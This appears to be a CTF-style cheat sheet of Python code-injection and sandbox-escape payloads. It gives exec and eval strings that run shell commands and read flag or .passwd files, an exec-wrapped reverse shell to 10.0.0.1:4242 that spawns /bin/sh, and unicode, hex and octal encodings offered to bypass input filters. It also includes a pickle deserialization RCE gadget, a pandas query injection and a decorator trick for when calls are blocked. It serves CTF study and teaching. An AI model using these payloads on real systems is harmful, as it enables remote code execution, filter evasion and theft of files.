* Python 3 builtin functions/constants - [Website](https://docs.python.org/3/library/functions.html)

    Python's builtin functions and constants provide a lot of useful information about the program's environment. Here are the most useful ones:

    | Function | Description |
    | --- | --- |
    | `dir()` | Without arguments, return the list of names in the current local scope. With an argument, attempt to return a list of valid attributes for that object. |
    | `vars()` | List variables and their value in the current scope with a dict object |
    | `help()` | Invoke the built-in help system. Can be used to execute commands for example in `help(help)` you just need to type `!ls` to execute `ls` |
    | `globals()` | Returns a dict object containing all global variables |
    | `locals()` | Returns a dict object containing all local variables |


* `exec`

    `exec` runs python code from a string. If the user can control the string, it can be used to execute arbitrary code.

    ```python
    exec("__import__('os').system('ls')") # List files
    exec("open('flag.txt').read()")       # Read flag.txt

    # Reverse shell to 10.0.0.1:4242
    exec('socket=__import__("socket");os=__import__("os");pty=__import__("pty");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")') 
    ```

* `eval`

    `eval` evaluates a python expression from a string. It can also be used to execute arbitrary code, but does not allow for multiple statements. (with ';' or '\n')

    ```python
    eval("__import__('os').system('ls')") # List files
    eval("open('flag.txt').read()")       # Read flag.txt
    eval("(a:=globals())") # Walrus operator trick to assign globals() to a variable and return it
    ```
    
* Command obfuscation

    * Unicode

        Python keywords can be written in unicode. For example, `exec` can be written as `eｘec`. This very useful to bypass filters.

        ```python
        def find_unicode_variant(s):
            result = ""
            for c in s:
                offset = ord(c) - ord('A')
                result += chr(0xff21 + offset)
            return result
        ```

        Note: Unicode characters take more than a single byte to be represented in an encoded format. For example `ｘ` is represented by the bytes `ef bd 98`. This can be a problem if the input is filtered to remove non ascii characters or if the size of the input is limited.

    * Hex

        If the input is filtered before being passed to python, the hex representation can be used to bypass the filter.

        ```python
        exec("\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x27\x6f\x73\x27\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x6c\x73\x27\x29") # eval("__import__('os').system('ls')")
        ```

        Note: This does not work when the filter is in python since this string is strictly equivalent to `"__import__('os').system('ls')"`

    * Ocal

        Same as hex, it is an alternative representation of python strings.

        ```python
        exec("\137\137\151\155\160\157\162\164\137\137\50\47\157\163\47\51\56\163\171\163\164\145\155\50\47\154\163\47\51") # eval("__import__('os').system('ls')")
        ```


* Escape sandbox environment

    When the environment is sandboxed, some functions are not directly available. Global variables can be used to access them.

    ```python
    ().__class__.__base__.__subclasses__() # Gives access to `object` subclasses

* Python's 2 input() function

    `python2`'s `input()` function is equivalent to `eval(raw_input())` in python3. So, you can execute arbitrary python expressions.

    ```python
    open("/tmp/out.txt", "w").write(open(".passwd").readline().strip())
    ```

* Pickle deserialization injection

    `pickle.loads` can execute code when deserializing a user provided string.

    ```python
    class rce():
        def __reduce__(self):
            import os
            return (os.system, ('ls',))
    payload_bytestring = pickle.dumps(rce())
    ```

* Python libraries that can execute commands

    Some python libraries allows for code/command execution when provided with unsanitized input. Here are the most common ones:

    ```python
    df.query('@__builtins__.__import__("os").system("ls")') # Pandas dataframe
    subprocess.call("ls", shell=True)
    subprocess.Popen("ls", shell=True)
    pty.spawn("ls")
    pty.spawn("/bin/bash")
    ```

* When calls are disabled

    WHen calls are disabled, an attacker can use decorators still execute code.

    ```python
    # equivalent to X = exec(input(X))
    @exec
    @input
    class X:
        pass
    ```


    [Google CTF challenge](https://ctftime.org/task/22891)
